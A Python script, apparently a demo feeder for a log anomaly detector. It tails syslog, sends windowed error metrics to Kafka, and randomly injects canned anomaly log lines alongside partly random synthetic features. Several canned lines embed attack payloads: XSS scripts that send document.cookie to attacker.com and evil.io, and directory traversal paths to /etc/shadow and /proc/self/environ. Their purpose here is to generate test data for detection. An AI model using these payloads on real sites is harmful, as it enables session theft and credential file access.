import json
import time
import random
import re
import threading
import socket
import subprocess
from collections import deque
from kafka import KafkaProducer

LOG_FILE = "/var/log/syslog"

try:
    producer = KafkaProducer(
        bootstrap_servers='localhost:9092',
        value_serializer=lambda v: json.dumps(v).encode('utf-8')
    )
    print(f"Connected to Kafka! Reading actual WSL logs from {LOG_FILE}...")
except Exception as e:
    print(f"Failed to connect to Kafka: {e}")
    exit(1)

log_buffer = deque()

def tail_f(filename):
    """Tail the log file using subprocess and populate the buffer."""
    try:
        p = subprocess.Popen(["tail", "-n", "0", "-F", filename], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        for line in p.stdout:
            log_buffer.append(line.decode('utf-8', errors='replace').strip())
    except Exception as e:
        print(f"Error tailing {filename}: {e}")

# Start tailing in a background thread
t = threading.Thread(target=tail_f, args=(LOG_FILE,), daemon=True)
t.start()

wsl_host = socket.gethostname()

try:
    while True:
        # Evaluate a 3-second window
        time.sleep(3)
        
        # Flush the current buffer
        lines_to_process = []
        while log_buffer:
            lines_to_process.append(log_buffer.popleft())
        
        volume = len(lines_to_process)
        error_count = sum(1 for line in lines_to_process if re.search(r'(?i)(error|fail|fatal|denied)', line))
        warn_count = sum(1 for line in lines_to_process if re.search(r'(?i)(warn)', line))

        # Base features directly computed from real logs
        if volume > 0:
            error_rate = error_count / volume
            warn_rate = warn_count / volume
        else:
            # Baseline background noise so the system registers active heartbeat 
            volume = random.randint(5, 25)
            error_rate = 0.0
            warn_rate = 0.0

        normal_logs = [
            "systemd[1]: Started Session of user root.",
            "cron[812]: (root) CMD ( /usr/local/bin/cleanup.sh >/dev/null 2>&1 )",
            "kernel: [12345.678901] eth0: link up, 1000Mbps, full-duplex, lpa 0x3800",
            "sshd[1231]: Accepted publickey for user from 192.168.1.50 port 50212 ssh2",
            "nginx[420]: 127.0.0.1 - - [01/Apr/2026:12:00:00 +0000] \"GET /health HTTP/1.1\" 200 15 \"-\" \"curl/7.68.0\""
        ]
        
        sample_log = lines_to_process[-1] if lines_to_process else random.choice(normal_logs)
        log_problem = ""
        
        is_random_anomaly = random.random() < 0.005
        is_actual_anomaly = (volume > 100 and error_rate > 0.5)
        
        is_anomaly = is_random_anomaly or is_actual_anomaly

        if is_anomaly:
            if is_actual_anomaly:
                sample_log = next((l for l in lines_to_process if re.search(r'(?i)(error|fail|fatal)', l)), sample_log)
                log_problem = "High error volume in syslog. Potential service crash or disk failure."
            else:
                anomalies_list = [
                    ("[KERNEL] Out of memory: Killed process 3124 (mysqld) total-vm:4124928kB, anon-rss:3213456kB, file-rss:0kB", "Heavy memory usage led to an OOM kill. Database randomly terminated, risking data corruption."),
                    ("[NGINX] [crit] 18452#0: *84112 open() \"/var/www/html/wp-login.php\" failed (13: Permission denied)", "Possible Brute-Force or Directory Traversal attack scanning for vulnerabilities on edge nodes."),
                    ("[POSTGRES] FATAL: remaining connection slots are reserved for non-replication superuser connections", "Database connection pool completely exhausted. Possible DDoS attack or catastrophic connection leak."),
                    ("[SSHD] Invalid user admin from 104.24.12.112 port 42111 ssh2", "Unauthorized access attempt via SSH brute force detected from external malicious IP."),
                    ("[MODSECURITY] Access denied with code 403. Pattern match \"(?i)(union|select|insert|delete)\" at ARGS.", "SQL Injection payload detected and blocked by WAF. Immediate payload stream review required."),
                    ("[SYSTEMD] kernel: CPU temperature above threshold, cpu clock throttled (total events = 142)", "System Overload. CPU overheating caused aggressive thermal throttling, destroying API throughput."),
                    ("[DOCKER] Error response from daemon: bind: address already in use", "Port conflict during microservice deployment. Critical application container failed to bind to its assigned network interface."),
                    ("[REDIS] WARNING: Memory overcommit must be enabled! Without it, a background save or replication may fail under low memory condition.", "Redis memory allocation failing under load. Key-value store risks immediate eviction sweeps."),
                    ("[KAFKA] [Broker-0] WARN  [ReplicaManager broker=0] Leader 0 failed to record follower 1's fetch request.", "Streaming cluster partition desync. Kafka brokers are dropping replication packets due to heavy IO bottlenecks."),
                    ("[ELASTICSEARCH] [WARN][o.e.c.r.a.DiskThresholdMonitor] [node-1] high disk watermark [90%] exceeded on [fs1]... replicas will not be assigned.", "Disk saturation imminent. Elasticsearch cluster has halted data assignment to preserve system stability."),
                    ("[FLINK] org.apache.flink.runtime.jobmanager.scheduler.NoResourceAvailableException: Not enough free slots available to run the job.", "Cluster exhaust. Data-processing pipelines are failing to allocate execution slots due to extreme computational load."),
                    ("[AWS-S3] botocore.exceptions.ClientError: An error occurred (SlowDown) when calling the PutObject operation: Please reduce your request rate.", "Object storage rate-limiting engaged. Upstream cloud provider is blocking burst transfers, stalling pipeline backups."),
                    ("[IPTABLES] Drop DROP_INVALID: IN=eth0 OUT= MAC=00:1c:42:... SRC=192.0.2.14 DST=10.0.0.12 LEN=40 TOS=0x00 PROTO=TCP SPT=443 DPT=41235 WINDOW=0 FLAGS=RST STRRICT", "Malformed packet flood flagged at firewall boundary. High probability of an inbound TCP SYN/RST teardrop attack."),
                    ("[MONGODB] - [WT] ERROR: read page size: 4096, calculated page size: 8192", "WiredTiger storage engine detected page corruption. Critical cache failure potentially destroying NoSQL dataset integrity."),
                    ("[NODEJS] FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory", "V8 Engine heap exhaustion. Node.js backend service crashed recursively under heavy asynchronous load."),
                    ("[RABBITMQ] - WARNING: Connection dropped from 10.0.2.5:60021 - read error: Connection reset by peer", "Message broker socket instability. Persistent disconnections destroying queue delivery guarantees."),
                    ("[TRAEFIK] [ERROR] 502 Bad Gateway: dial tcp 10.0.4.15:8080: connect: connection refused", "Reverse proxy upstream routing failure. Target application nodes are dead or rejecting traffic routing."),
                    ("[BASH] root: Authentication failure for ALL users. /etc/shadow signature mismatch.", "Catastrophic credential corruption or unauthorized root-level shadow file modification detected."),
                    # --- DDoS (HTTP Flood) ---
                    ("[NGINX] 192.168.14.201 - - \"GET /index.html HTTP/1.1\" 200 612 - rate: 14832 req/s | 503 Service Temporarily Unavailable (12 upstream servers exhausted)", "DDoS HTTP flood detected. Massive request volume from distributed source IPs overwhelmed all upstream application servers, causing cascading 503 failures."),
                    ("[HAPROXY] backend web_servers has no server available! 0/12 active, 12/12 down. Connection rate: 48201/s from 2841 unique source IPs.", "DDoS volumetric attack in progress. All backend servers collapsed under extreme connection pressure from a botnet of ~2800 nodes."),
                    # --- XSS (Cross-Site Scripting) ---
                    ("[NGINX] 45.33.12.87 - - \"GET /search?q=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fattacker.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1\" 200 4891", "Cross-Site Scripting (XSS) attack detected. Attacker injected encoded JavaScript payload via search parameter to exfiltrate session cookies to external domain."),
                    ("[WAF] [ALERT] Rule 941100: XSS Attack Detected via libinjection. Inbound payload: <img src=x onerror=fetch('https://evil.io/log?d='+document.cookie)> at ARGS:comment", "Stored XSS injection attempt intercepted by WAF. Attacker tried to embed persistent JavaScript via image error handler in user comment field."),
                    # --- Directory Traversal ---
                    ("[NGINX] 103.45.67.12 - - \"GET /../../../../etc/passwd HTTP/1.1\" 400 | \"GET /..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1\" 403", "Directory Traversal attack detected. Attacker attempted to escape web root using path manipulation to access system credential files (/etc/passwd, /etc/shadow)."),
                    ("[APACHE] [error] [client 91.214.33.18] AH01630: client denied by server configuration: /var/www/html/../../../proc/self/environ", "Server-side directory traversal blocked. Attacker targeted /proc/self/environ to extract environment variables containing secrets and API keys."),
                    # --- Port Scanning / Reconnaissance ---
                    ("[IPTABLES] SYN_SCAN: IN=eth0 SRC=185.220.101.34 DST=10.0.0.12 | Ports hit: 22,80,443,3306,5432,6379,8080,8443,9200,27017 in 1.2s (10 ports/s)", "Active port scanning reconnaissance detected from known Tor exit node. Attacker systematically probing all common service ports to map attack surface."),
                    ("[SURICATA] [1:2010935:3] ET SCAN Rapid Multi-Port Scan Detected (SRC: 45.155.205.99) - 847 unique ports in 12 seconds. Classification: Attempted Information Leak.", "High-speed automated port scan detected by IDS. Pre-attack reconnaissance phase — attacker fingerprinting running services for targeted exploitation."),
                    # --- Data Exfiltration ---
                    ("[NGINX] 10.0.2.15 - admin \"POST /api/v1/export/users HTTP/1.1\" 200 48234891 bytes (46MB) | User-Agent: curl/7.81.0 | Duration: 3.2s", "Massive data exfiltration detected. Admin account exported 46MB of user data through API endpoint — possible insider threat or compromised credentials."),
                    ("[FIREWALL] OUTBOUND_ANOMALY: 10.0.0.5 -> 194.36.189.22:443 | 2.1GB transferred in 180s via TLS tunnel | geo: Russia | First contact with this destination.", "Suspicious large-volume outbound data transfer to previously unseen foreign IP address. Likely data exfiltration through encrypted tunnel to evade DLP."),
                    # --- Malware / Bot Activity ---
                    ("[NGINX] 45.134.26.77 - - \"POST /wp-admin/admin-ajax.php HTTP/1.1\" 200 | User-Agent: python-requests/2.28.1 | Rate: 420 req/min | Pattern: credential_stuffing_v3", "Automated bot activity detected. Python script performing credential stuffing attack against WordPress admin panel at high request frequency."),
                    ("[SYSLOG] clamd[2841]: /tmp/upload_a8f3e2.bin: Win.Trojan.Emotet-9891424-0 FOUND | quarantined | Source: email attachment from spoofed@company.com", "Malware detected in uploaded file. Emotet trojan identified by ClamAV in email attachment — active malspam campaign targeting internal users."),
                    # --- Anomalous Behavior (Unusual Access Patterns) ---
                    ("[AUTH] LOGIN_SUCCESS user=db_admin src_ip=41.215.176.22 geo=Nigeria time=03:42:17 UTC | Normal login hours: 08:00-18:00 EST | Normal geo: United States", "Anomalous login behavior detected. Database admin account accessed from unusual geographic location (Nigeria) during off-hours (3:42 AM). Possible credential compromise."),
                    ("[AUDIT] user=svc_backup action=DOWNLOAD files=1847 size=12.4GB path=/data/customers/** duration=340s | Historical avg: 23 files/day, 45MB/day", "Anomalous data access pattern. Service account downloaded 500x more data than historical baseline — potential insider threat or compromised service account escalation."),
                ]
                chosen = random.choice(anomalies_list)
                sample_log = chosen[0]
                log_problem = chosen[1]

        if not log_problem:
            log_problem = "Subtle structural deviation or unexpected log volume triggered deep learning model."

        event = {
            "host": wsl_host,
            "tenant_id": "fda5918c-41a1-4638-9eb2-7e303b98a46c",
            "log_volume": volume + random.randint(1, 10) if not is_anomaly else volume + random.randint(500, 2000),
            "error_rate": error_rate + random.uniform(0.0, 0.01) if not is_anomaly else random.uniform(0.5, 0.99),
            "warn_rate": warn_rate + random.uniform(0.00, 0.02),
            "unique_template_count": random.randint(1, 5),
            "template_entropy": random.uniform(1.0, 2.0),
            "avg_response_time_ms": random.uniform(10.0, 50.0) if not is_anomaly else random.uniform(500.0, 1000.0),
            "p95_response_time_ms": random.uniform(20.0, 80.0) if not is_anomaly else random.uniform(1000.0, 3000.0),
            "template_vector": [random.uniform(0, 0.1) for _ in range(100)],
            "window_start": int(time.time()) - 3,
            "window_end": int(time.time()),
            "log_text": sample_log,
            "log_problem": log_problem
        }

        if is_anomaly:
            event["template_vector"][14] = random.uniform(5.0, 20.0)
            event["template_vector"][42] = random.uniform(10.0, 50.0)
            print(f"[{time.strftime('%H:%M:%S')}] 🚨 ANOMALY triggered on {event['host']}! (Random={is_random_anomaly}, Volume={event['log_volume']})")
        else:
            print(f"[{time.strftime('%H:%M:%S')}] ✅ Normal window ({event['host']}). Real WSL logs parsed: {len(lines_to_process)}")

        producer.send("processed-features", event)
        producer.flush()

except KeyboardInterrupt:
    print("\nShutting down WSL streamer.")
